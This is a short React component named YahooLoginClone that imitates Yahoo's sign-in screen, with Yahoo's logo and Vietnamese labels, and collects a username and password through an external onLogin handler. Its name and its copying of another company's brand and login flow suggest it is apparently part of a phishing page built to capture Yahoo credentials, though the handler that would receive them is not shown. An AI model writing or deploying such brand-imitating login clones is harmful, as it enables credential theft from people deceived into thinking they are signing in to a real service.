import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';
import yahooLogo from '@/assets/social/yahoo.svg';

const YahooLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
        <div className="text-center mb-6">
            <img src={yahooLogo} alt="Yahoo" className="h-7 w-auto mx-auto"/>
            <h2 className="text-xl font-semibold mt-4">Đăng nhập</h2>
            <p className="text-sm">sử dụng tài khoản Yahoo của bạn</p>
        </div>
        <form onSubmit={onLogin} className="space-y-4">
            <Input id="account" name="account" type="text" placeholder="Tên đăng nhập" required className="h-12 border-gray-300 focus:border-purple-500 focus:ring-purple-500 text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-12 border-gray-300 focus:border-purple-500 focus:ring-purple-500 text-black" disabled={isLoading} />
            <Button type="submit" className="w-full bg-[#410093] hover:bg-[#340075] text-white h-11 text-base font-bold" disabled={isLoading}>
                {isLoading ? <Loader className="h-5 w-5 animate-spin" /> : 'Tiếp theo'}
            </Button>
        </form>
        <div className="text-center text-sm mt-4">
            <button className="text-blue-600 hover:underline">Bạn không thể đăng nhập?</button>
        </div>
    </div>
);

export default YahooLoginClone;